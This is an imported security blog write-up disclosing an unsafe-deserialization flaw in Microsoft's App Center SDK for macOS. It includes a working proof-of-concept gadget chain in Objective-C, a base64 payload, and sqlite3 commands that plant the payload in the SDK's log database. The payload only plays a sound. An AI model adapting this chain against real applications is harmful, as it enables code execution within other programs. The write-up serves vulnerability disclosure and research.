---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-07_feeding-tasty-objects-to-visual-studios-app-center-sdk-for-apple.md
original_filename: 2023-03-07_feeding-tasty-objects-to-visual-studios-app-center-sdk-for-apple.md
title: Feeding Tasty Objects to Visual Studio's App Center SDK for Apple
category: documents
detected_topics:
- cloud-security
- supply-chain
- sso
- sqli
- command-injection
- automation-abuse
tags:
- imported
- documents
- cloud-security
- supply-chain
- sso
- sqli
- command-injection
- automation-abuse
language: en
raw_sha256: 0f564887dce21df0243aa27047ef3185d354bea3ec3133fd23d2160779ff023f
text_sha256: 9de68aaf84efa73b9166e30f296ffc90b954d2896f193d190b18025e43c39b0b
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# Feeding Tasty Objects to Visual Studio's App Center SDK for Apple

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-07_feeding-tasty-objects-to-visual-studios-app-center-sdk-for-apple.md
- Source Type: markdown
- Detected Topics: cloud-security, supply-chain, sso, sqli, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `0f564887dce21df0243aa27047ef3185d354bea3ec3133fd23d2160779ff023f`
- Text SHA256: `9de68aaf84efa73b9166e30f296ffc90b954d2896f193d190b18025e43c39b0b`


## Content

---
title: "Feeding Tasty Objects to Visual Studio's App Center SDK for Apple"
page_title: "Secfault Security - Feeding Tasty Objects to Visual Studio's App Center SDK for Apple"
url: "https://secfault-security.com/blog/ms-app-center.html"
final_url: "https://secfault-security.com/blog/ms-app-center.html"
authors: ["Jenny (@OldM4nHunting)"]
programs: ["Microsoft"]
bugs: ["Insecure deserialization", "MacOS"]
publication_date: "2023-03-07"
added_date: "2023-03-08"
source: "pentester.land/writeups.json"
original_index: 1414
---

![](../images/logo.png)

[Home](../index.html) [Company](../company.html) [Services](../services.html) [Trainings](../trainings.html) [Jobs](../jobs.html) [Blog](../blog.html) [Contact](../contact.html)

# Feeding Tasty Objects to Visual Studio's App Center SDK for Apple

Posted on March 7, 2023 by jenny

This write-up will present you a Proof-of-Concept exploit for an unsafe object deserialization flaw in macOS applications using [Microsoft’s AppCenter SDK for iOS and macOS](https://github.com/microsoft/appcenter-sdk-apple) before release 5.0.1. The PoC for obtaining code execution is based on the approach described by [Sector7 for NSKeyedUnarchiver instances deserializing objects of arbitrary classes](https://sector7.computest.nl/post/2022-08-process-injection-breaking-all-macos-security-layers-with-a-single-vulnerability/); it requires local write access to an SQLite database file used by the SDK for storing serialized objects.

If you are in a hurry, you might want to jump directly to the section _AppKit Dinner Music_, containing the PoC payload. I hope some of you have more time and enjoy reading something on the journey of finding, the flaw itself, and developing the PoC. Other people’s write-ups helped me a lot in my daily work over all the years and I would like to give back something by describing the process of identifying and exploiting this issue.

## My Friend IDA and other Tools

The issue we are talking about was identified during a binary analysis of some macOS application. I had heard about [Sector7’s NSKeyedUnarchiver vulnerability](https://sector7.computest.nl/post/2022-08-process-injection-breaking-all-macos-security-layers-with-a-single-vulnerability/) that affected the AppKit UI restore mechanism and allowed for arbitrary code execution. Hence I wanted to check whether this could be a feasible attack path.

Trying to find an easy way for checking if my target binary was vulnerable, I first took a look at the proposed mitigation. The mitigation consists in implementing the below method to signal the support for a secure unarchiving of the stored UI state:
  
  
  - (BOOL)applicationSupportsSecureRestorableState:(NSApplication *)app {
  return YES;
  }

I thought that this would be a _quick_ task for my friend [IDA](https://hex-rays.com/ida-pro/): surely, searching for a reference to the function `applicationSupportsSecureRestorableState` would show some interesting results!

As it always ends, when having a date with IDA, things are slightly less trivial as initially hoped for. Of course, there was no reference to a function named `applicationSupportsSecureRestorableState`. So I searched for anything that was related to Apple’s `NSKeyedArchiver` class, hoping that something would attract my attention. And indeed, stubbornness paid out when finding a call setting the [`NSKeyedUnarchiver` property `requiresSecureCoding`](https://developer.apple.com/documentation/foundation/nskeyedunarchiver/1410824-requiressecurecoding?language=objc).

![](../images/ms-app-sdk_idaNO.png)

With the `NSKeyedUnarchiver` object in register `rdi` and the method selector in register `rsi`, the cleared `edx` is our boolean property argument. Since this is cleared by the highlighted `xor` operation, we just found an unarchiver that is generally prone to unsafe object deserialization attacks. But well, the binary was really huge, so how to find out where the unarchiver is actually used?

I assume all of us had been asked once or twice what our favorite tools for code auditing and testing are. How many of you thought about mentioning your preferred search engine? I never did! Still, there had been so many situations were I struggled for hours to find more information on a system or code base until I searched the Internet for some recognizable string or phrase. And I mean the requirements for a phrase to be _recognizable_ are very low nowadays.

So did I here: I noticed that the function utilizing the `NSKeyedUnarchiver` instance, as several other adjacent functions in the binary, seem to be methods of classes with the prefix `MSAC`.

![](../images/ms-app-sdk_idafuncname.png)

Speculating that those might belong to some kind of dependency, I searched for the string and _voila_ , reversing was never this easy!

![](../images/ms-app-sdk_github.png)

It turns out that the unarchiver is used in Microsoft’s Visual Studio App Center SDK for iOS and macOS, which can be integrated in applications to collect usage statics or crash logs.

Does that mean that _all_ applications relying on the affected part of the SDK would be vulnerable? Ooooooops…

## Checking the Ingredients

But what’s the use of an insecure unarchiver, if we cannot control the data it is processing? The good thing is, due to its nature of deserializing previously serialized data, it seems unlikely that it will operate on runtime or static data only. Further, since we are talking about routines that relate to analytics and logging, additional protection measures ensuring the integrity of the serialized data do not necessarily have to be expected.

Both assumptions turn out to be true: Now that we have the whole codebase of this dependency, we can inspect the callers of the `unarchiveKeyedData` function and get an idea of the data that it processes. One caller is the function `logsWithCondition` inside the class [`MSACLogDBStorage`](https://github.com/microsoft/appcenter-sdk-apple/blob/5.0.0/AppCenter/AppCenter/Internals/Storage/MSACLogDBStorage.m#L280):
  
  
  - (NSArray<NSArray *> *)logsWithCondition:(NSString *_Nullable)condition andValues:(nullable MSACStorageBindableArray *)values {
  NSMutableArray<NSArray *> *logEntries = [NSMutableArray<NSArray *> new];
  NSMutableString *query = [NSMutableString stringWithFormat:@"SELECT * FROM \"%@\"", kMSACLogTableName];
  if (condition.length > 0) {
  [query appendFormat:@" WHERE %@", condition];
  }
  NSArray<NSArray *> *entries = [self executeSelectionQuery:query withValues:values];
  
  // Get logs from DB.
  for (NSMutableArray *row in entries) {
  NSNumber *dbId = row[self.idColumnIndex];
  NSData *logData = [[NSData alloc] initWithBase64EncodedString:row[self.logColumnIndex]
  options:NSDataBase64DecodingIgnoreUnknownCharacters];
  id<MSACLog> log;
  
  // Deserialize the log.
  log = (id<MSACLog>)[MSACUtility unarchiveKeyedData:logData];
  if (!log) {
  
  // The archived log is not valid.
  MSACLogError([MSACAppCenter logTag], @"Deserialization failed for log with Id %@", dbId);
  [self deleteLogFromDBWithId:dbId];
  continue;
  }

This first executes an SQL query, where data is fetched from the `kMSACLogTableName` table. This constant is actually the string `logs`. Afterwards, the data of a specific column is base64-decoded first and then used as input data to our unarchiver.

Luckily, I already briefly inspected the local data the analyzed application stores in the file system. There was, so I remembered, a directory named `com.microsoft.appcenter`. On a closer look now, I found out that it contains a SQLite database file named `Logs.sqlite`. And this database had a tabled named, _who wants to guess_ , `logs`. Further, the present entries had a huge string in one column that appears to be base64-encoded data. Decoding it, shows that the payload starts with the file format specifier `bplist00` and also contains the string `NSKeyedArchiver`.
  
  
  00000000: 6270 6c69 7374 3030 d401 0203 0405 06c6  bplist00........
  00000010: c758 2476 6572 7369 6f6e 5824 6f62 6a65  .X$versionX$obje
  00000020: 6374 7359 2461 7263 6869 7665 7254 2474  ctsY$archiverT$t
  00000030: 6f70 1200 0186 a0af 1024 0708 1254 5862  op.......$...TXb
  00000040: 656c 6d72 7677 7b7c 7d7e 7f80 8185 888b  elmrvw{|}~......
  ...
  000007c0: 6a6b 5f10 0f4e 534b 6579 6564 4172 6368  jk_..NSKeyedArch
  000007d0: 6976 6572 d1c8 c954 726f 6f74 8001 0008  iver...Troot....
  000007e0: 0011 001a 0023 002d 0032 0037 005e 0064  .....#.-.2.7.^.d

Monitoring the database entries across application restarts and reboots showed that they actually seem to be used: every now and then, the entries in the `logs` table changed.

Incurable optimists as we are, we can now be 99.9%™ certain (well, we can at least hope) that write access to this file location will allow us to execute code in the context of our target application.

## Cooking the Meal

Now that we have our flaw, we need some input to proof its exploitability. Generously, Sector7 provided some details on their deserialization gadgets in [their blog post](https://sector7.computest.nl/post/2022-08-process-injection-breaking-all-macos-security-layers-with-a-single-vulnerability/) that we will stick to here. The gadgets should allow, when correctly chained, to call a chosen method of a deserialized object without arguments.

But what method of what class would I want to call? I searched for a serializable class (i.e., one that implements the `NSCoding` protocol) that would allow me to easily observe successful code execution. I finally picked the `NSSound` class that can be initialized with an URL pointing to a sound file that should be played when calling the object’s `play` method.

This gives us the following code:
  
  
  NSURL *path = [NSURL fileURLWithPath:@"/System/Library/Sounds/Hero.aiff"];
  NSSound *sound = [[NSSound alloc] initWithContentsOfURL:path byReference:YES];

Now, what do we have to do with this `NSSound` object to call the `play` method during deserialization? As described in the mentioned blog post, the `NSKeyedUnarchiver` will call the method `initWithCoder:` for every object it wants to deserialize. The existence of this method is what the `NSCoding` protocol guarantees us. We now need one or more classes that have useful `initWithCoder:` implementations, allowing us to do more than just some property initialization.

Sector7 found two nice classes that can be stacked: The [`NSCustomImageRep`](https://developer.apple.com/documentation/appkit/nscustomimagerep?language=objc) class, which has a property `delegate` of type `id` and a property `drawSelector`. The latter is a selector created from a string as part of the object’s deseralization (the properties are denoted as `drawObject` and `drawMethod` in the blog post). They further found, that in case the `NSCustomImageReps`’s `draw` method gets called, it’s actually the `drawSelector` of the `delegate` object that is executed. In summary, if we initialize a `NSCustomImageRep` object with our `NSSound` object as its `delegate` and a selector specifying the `play` method, our sound file should be played once the `NSCustomImageRep`’s `draw` method gets called:
  
  
  SEL sel = @selector(play);
  NSCustomImageRep *img = [[NSCustomImageRep alloc] initWithDrawSelector:sel delegate:sound];

But how do we trigger the `draw` method? This is where `NSRuleEditor` comes into play: the `initWithCoder:` method of the [`NSRuleEditor`](https://developer.apple.com/documentation/appkit/nsruleeditor?language=objc) class performs a call to the method [`bind:toObject:withKeyPath:options:`](https://developer.apple.com/documentation/objectivec/nsobject/1458185-bind?language=objc) for creating a [binding](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/CocoaBindings/CocoaBindings.html).

When creating the binding, `NSRuleEditor` will ultimately call a method designated by the property `keyPath` on an object named `observable`. Again, both the `observable` and `keyPath` arguments are under our control during the deserialization process. Therefore, setting the `observable` to our `NSCustomImageRep` object and `keyPath` to the string `draw` should be exactly what we need.

The creation of such an `NSRuleEditor` object, however, was not as trivial as in the `NSSound` and `NSCustomeImageRep` cases. The two instance variables `_boundArrayOwner` and `_boundArrayKeyPath` need to be set for this.

![](../images/ms-app-sdk_xcdeb.png)

Having only limited experience with reactive programming in Cocoa, I could not swiftly find any method that seemed to manipulate these fields and my attempts at creating a binding with the `bind:toObject:withKeyPath:options:` method only resulted in crashes. So I decided to just create this object without setting these fields explicitly and check whether I could modify the serialized payload appropriately.

This resulted in the following payload to be archived by `NSKeyedArchiver`:
  
  
  #import <Foundation/Foundation.h>
  #import "Archiver.h"
  #import <Appkit/Appkit.h>
  
  int main(int argc, const char * argv[]) {
  // create object with target method that should be called as PoC
  NSURL *path = [NSURL fileURLWithPath:@"/System/Library/Sounds/Hero.aiff"];
  NSSound *sound = [[NSSound alloc] initWithContentsOfURL:path byReference:YES];
  
  // create NSCustomImageRep with a selector that points to the target method
  SEL sel = @selector(play);
  NSCustomImageRep *img = [[NSCustomImageRep alloc] initWithDrawSelector:sel delegate:sound];
  
  //create NSRuleEditor to manually add the NSCustomImageRep to via plist modification
  NSRuleEditor *log = [NSRuleEditor new];
  
  //archive an array with all needed objects
  NSArray *arr = [NSArray arrayWithObjects:log, sound, path,@"draw", img, nil];
  NSData *arch = [Archiver archiveKeyedData:arr];
  [arch writeToFile:@"/tmp/arch.plist" atomically:YES];
  }

As one can see, the `NSRuleEditor` object is not specifically initialized. Afterwards, all relevant objects are collected in an array to serialize them. Further the `NSString` `draw` is added to the array, since we later want to point the mentioned `_boundArrayKeyPath` to it. The referenced `Archiver` class simply uses the [archiving routine](https://github.com/microsoft/appcenter-sdk-apple/blob/5.0.0/AppCenter/AppCenter/Internals/Util/MSACUtility.m#L82) as it is part of the AppCenter SDK.

## Feeding Objects into NSRuleEditor

Retrospectively, this step was rather easy comparing it to my attempts to set the `NSRuleEditor` fields `_boundArrayOwner` and `_boundArrayKeyPath` programmatically.

The above code will produce a binary property list. For some reason Xcode refused to open it directly, but this can be resolved by converting it to XML format:
  
  
  user@MacBook-Air /tmp % plutil -convert xml1 arch.plist
  user@MacBook-Air /tmp % open arch.plist

Xcode will now show various object items contained in the property list. Now three questions need to be answered:

  1. What entries will specify the values for the `_boundArrayOwner` and `_boundArrayKeyPath`?
  2. How are relations between the different items expressed?
  3. How can we reference our `NSCustomImageRep` object and the string `draw`?

The first step was a real no-brainer. One of the first items was a dictionary with the keys `NSRuleEditorBoundArrayKeyPath` and `NSRuleEditorBoundArrayOwner`. Nice!

![](../images/ms-app-sdk_plruled.png)

Getting an overview on the different items, one can observe that there seem to be three different types. First, one type has items that seem to contain basic objects, such as `String` or `Number`. Those simply have an index, the type information and their value. More complex items are of the type `Dictionary`. Those either contain an array named `$classes` and a string with the key `$classname` or have a `$class` entry followed by a number of descriptive field names, as shown in the screenshot above.

After a good cup of tea (yes I know real hackers only drink black coffee -,-), I concluded that the `$classes/$classname` dictionary contains the class information and the other two item types simply represent the serialized objects, either for basic or more complex classes. This can also be verified by checking the `$class` entry of the more complex object representation. As it can be seen in the last screenshot, this contains an entry named `CF$UID` \- and its value coincides with the index of the class information belonging to the object.

Now that we understood the format, we are looking for the object representations of the `NSCustomImageRep` object and the string `draw`. The `NSString`, since it is one of the basic types, can easily be found. So we note its index.

As I personally have no clue how a serialized `NSCustomImageRep` instance could look like, I searched for the class name in the class information items instead.

![](../images/ms-app-sdk_pl2829.png)

In my case, the relevant class information is stored in item 34. So I simply had to look for a dictionary item, with the `$class` entry set to the `CF$UID` 34\. This gave me the index 29 for my example property list (and 28 for the `draw` string).

Last thing that had to be done was changing the `NSRuleEditorBoundArrayKeyPath` and `NSRuleEditorBoundArrayOwner` `CF$UID`s to these indices.

Once everything was adjusted, I converted the property list back to binary format and most importantly crossed my fingers ;)
  
  
  user@MacBook-Air /tmp % plutil -convert binary1 arch.plist

## AppKit Dinner Music 

After all of this, I finally had or Proof-of-Concept candidate. The only thing left to do was to put the payload into the database file. As you might remember, the log entires were base64-encoded, so this has to be our first action on the PoC property list file:
  
  
  user@MacBook-Air /tmp % base64 -i arch.plist -o arch.plist.b64
  user@MacBook-Air /tmp % cat arch.plist.b64
  YnBsaXN0MDDUAQIDBAUGxsdYJHZlcnNpb25YJG9iamVjdHNZJGFyY2hpdmVyVCR0b3ASAAGGoK8QJAcIElRYYmVsbXJ2d3t8fX5/gIGFiIuOkpyio6apqri5vb/AxFUkbnVsbNIJCgsRWk5TLm9iamVjdHNWJGNsYXNzpQwNDg8QgAKAF4AYgByAHYAj3xAjExQVFhcYGRobHB0eHyAhIiMkJQomJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBNTdDQ0M3RkdISTdDQ0M1N05PUFFSU18QFE5TUnVsZUVkaXRvckVkaXRhYmxlXxAUTlNSdWxlRWRpdG9yRGVsZWdhdGVfEBZOU0NvbnRyb2xMaW5lQnJlYWtNb2RlXxASTlNSdWxlRWRpdG9yU2xpY2VzWk5TU3Vidmlld3NfEBROU1J1bGVFZGl0b3JSb3dDbGFzc1hOU3ZGbGFnc18QF05TUnVsZUVkaXRvclNsaWNlSGVpZ2h0XxAZTlNSdWxlRWRpdG9yVmFsdWVzS2V5UGF0aF8QH05TUnVsZUVkaXRvclN1YnJvd3NBcnJheUtleVBhdGhdTlNOaWJUb3VjaEJhcltOU0RyYWdUeXBlc18QHU5TUnVsZUVkaXRvckJvdW5kQXJyYXlLZXlQYXRoXxAmTlNWaWV3V2FudHNCZXN0UmVzb2x1dGlvbk9wZW5HTFN1cmZhY2VfEBlOU0NvbnRyb2xXcml0aW5nRGlyZWN0aW9uXxATTlNDb250cm9sQ29udGludW91c18QHk5TQWxsb3dzTG9naWNhbExheW91dERpcmVjdGlvbl8QGU5TUnVsZUVkaXRvckRpc2FsbG93RW1wdHldTlNDb250cm9sU2l6ZV8QD05TTmV4dFJlc3BvbmRlcltOU0ZyYW1lU2l6ZV8QHk5TUnVsZUVkaXRvckFsaWdubWVudEdyaWRXaWR0aF8QFk5TQ29udHJvbFRleHRBbGlnbm1lbnRfEB5OU0NvbnRyb2xSZWZ1c2VzRmlyc3RSZXNwb25kZXJfEBtOU0NvbnRyb2xVc2VzU2luZ2xlTGluZU1vZGVfECNOU1J1bGVFZGl0b3JBbGxvd3NFbXB0eUNvbXBvdW5kUm93c1lOU0VuYWJsZWReTlNDb250cm9sU2l6ZTJfEBhOU1J1bGVFZGl0b3JTbGljZXNIb2xkZXJfEBhOU1J1bGVFZGl0b3JJdGVtc0tleVBhdGhfEBdOU0NvbnRyb2xTZW5kQWN0aW9uTWFza18QGk5TUnVsZUVkaXRvclJvd1R5cGVLZXlQYXRoXxAXTlNSdWxlRWRpdG9yTmVzdGluZ01vZGVfEBtOU1J1bGVFZGl0b3JCb3VuZEFycmF5T3duZXIJgAAQAIAVgAOAEREBACNAQAAAAAAAAIAPgA2AAIAJgBwJCAgIgBaAAIAHI0BSwAAAAAAACAgICYAEgA4QBIAMEAKAHdIJClVXoVaABIAG2AogFyZZGR0nWjVcXV5fYGFbTlNTdXBlcnZpZXeACAmABYACgAIRARKAAIAH0gkKY2SggAbSZmdoaVgkY2xhc3Nlc1okY2xhc3NuYW1lo2lqa15OU011dGFibGVBcnJheVdOU0FycmF5WE5TT2JqZWN0VnswLCAwfdJmZ25vpG9wcWtfEBxfTlNSdWxlRWRpdG9yVmlld1NsaWNlSG9sZGVyVk5TVmlld1tOU1Jlc3BvbmRlctIJCnN1oXSACoALXxAaTlNSdWxlRWRpdG9ySXRlbVBCb2FyZFR5cGXSZmd4eaN5emtcTlNNdXRhYmxlU2V0VU5TU2V0V3Jvd1R5cGVXc3Vicm93c1hjcml0ZXJpYV1kaXNwbGF5VmFsdWVzWmJvdW5kQXJyYXlfEBNOU011dGFibGVEaWN0aW9uYXJ50oIKg4RcTlNCb3VuZEFycmF5gBOAFNIJCoaHoIAG0mZniYqiimtfECFfTlNSdWxlRWRpdG9yVmlld1VuYm91bmRSb3dIb2xkZXLSCQqMjaCABtJmZ4+QpZCRcHFrXE5TUnVsZUVkaXRvcllOU0NvbnRyb2zVCpOUlZaXmEOam1pOU0RlbGVnYXRlXxARTlNTb3VuZFNob3VsZExvb3BVTlNVcmxdTlNTb3VuZFZvbHVtZYAbgAAIgBgjP/AAAAAAAADTnQqen6ChV05TLmJhc2VbTlMucmVsYXRpdmWAAIAagBlfECdmaWxlOi8vL1N5c3RlbS9MaWJyYXJ5L1NvdW5kcy9IZXJvLmFpZmbSZmekpaKla1VOU1VSTNJmZ6eooqhrV05TU291bmRUZHJhd9irCqytrq+wsbKztLW2tzc3XE5TRHJhd09iamVjdFZOU1NpemVcTlNEcmF3TWV0aG9kXxAQTlNDb2xvclNwYWNlTmFtZVxOU0NvbG9yU3BhY2VfEA9OU0JpdHNQZXJTYW1wbGVfEBlOU0ludGVybmFsTGF5b3V0RGlyZWN0aW9ugBeAIoAHgCGAHoAfXxAZTlNDYWxpYnJhdGVkUkdCQ29sb3JTcGFjZdK6Cru8VE5TSUQQAYAg0mZnvq+ir2tUcGxhedJmZ8HCo8LDa18QEE5TQ3VzdG9tSW1hZ2VSZXBaTlNJbWFnZVJlcNJmZ8VqomprXxAPTlNLZXllZEFyY2hpdmVy0cjJVHJvb3SAAQAIABEAGgAjAC0AMgA3AF4AZABpAHQAewCBAIMAhQCHAIkAiwCNANYA7QEEAR0BMgE9AVQBXQF3AZMBtQHDAc8B7wIYAjQCSgJrAocClQKnArMC1ALtAw4DLANSA1wDawOGA6EDuwPYA/IEEAQRBBMEFQQXBBkEGwQeBCcEKQQrBC0ELwQxBDIEMwQ0BDUENwQ5BDsERARFBEYERwRIBEoETAROBFAEUgRUBFkEWwRdBF8EcAR8BH4EfwSBBIMEhQSIBIoEjASRBJIElASZBKIErQSxBMAEyATRBNgE3QTiBQEFCAUUBRkFGwUdBR8FPAVBBUUFUgVYBWAFaAVxBX8FigWgBaUFsgW0BbYFuwW8Bb4FwwXGBeoF7wXwBfIF9wX9BgoGFAYfBioGPgZEBlIGVAZWBlcGWQZiBmkGcQZ9Bn8GgQaDBq0Gsga1BrsGwAbDBssG0AbhBu4G9QcCBxUHIgc0B1AHUgdUB1YHWAdaB1wHeAd9B4IHhAeGB4sHjgeTB5gHnAevB7oHvwfCB9QH1wfcAAAAAAAAAgEAAAAAAAAAygAAAAAAAAAAAAAAAAAAB94=

Before the above payload can be stored in the database, the target application must be quit to prevent messing things up. Now, insert a new entry to the `logs` table with `groupId` set to `Analytics` and `priority` 1:
  
  
  user@MacBook-Air com.microsoft.appcenter % sqlite3 ~/Library/Application Support/whatever/com.microsoft.appcenter/Logs.sqlite
  
  sqlite> insert into logs ("groupId","log","priority") values ("Analytics","YnBsaXN0MDDUAQIDBAUGxsdYJHZlcnNpb25YJG9iamVjdHNZJGFyY2hpdmVyVCR0b3ASAAGGoK8QJAcIElRYYmVsbXJ2d3t8fX5<...>,1);

The application can then be started again and the Hero sound should be played shortly afterwards. Has anything ever sounded better than this?

Unfortunately, our new jukebox is a bit flaky. But accesses to the sound file can be tracked via the `fs_usage` command:
  
  
  user@MacBook-Air ~ % sudo fs_usage | grep aiff

On using this approach, keep in mind that the file will also be accessed during serialization.

## The End

I want to thank all the IT folks for creating such an enormous knowledge-base that is accessible to anyone. Cheers also to Secfault Security for making this PoC and post possible.

I hope you enjoyed your meal :)

PS: Special greetings to Fabs (although this is not really 0day)

© 2016 - 2026 Secfault Security GmbH | [Imprint](../imprint.html)
